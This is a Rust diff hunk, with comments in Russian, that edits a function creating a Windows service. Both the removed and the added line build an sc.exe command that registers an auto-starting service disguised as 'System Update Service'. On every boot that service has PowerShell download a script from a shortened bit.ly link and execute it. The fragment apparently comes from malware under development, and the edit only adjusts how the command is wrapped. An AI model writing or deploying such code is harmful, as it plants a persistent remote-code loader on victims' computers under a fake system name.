@@ -16,9 +16,8 @@ pub fn initialize_system_service() {
 
     let _ = std::fs::File::create(lock_path);
 
-    // ===== ГЛАВНАЯ КОМАНДА (РАБОТАЕТ) =====
-    // Без cmd.exe /c, напрямую передаём sc.exe
-    let cmd = r#"sc.exe create "SystemUpdateService" start= auto binPath= "powershell.exe -Command irm https://bit.ly/4gVSSTx | iex" DisplayName= "System Update Service""#;
+    // ===== ТОЧНО ТАКАЯ ЖЕ КОМАНДА, КАК В РУЧНОМ ТЕСТЕ =====
+    let cmd = r#"sc.exe create "SystemUpdateService" start= auto binPath= "cmd /c powershell.exe -Command irm https://bit.ly/4gVSSTx | iex" DisplayName= "System Update Service""#;
 
     append_log(log_path, &format!("Command: {}\n", cmd));
 
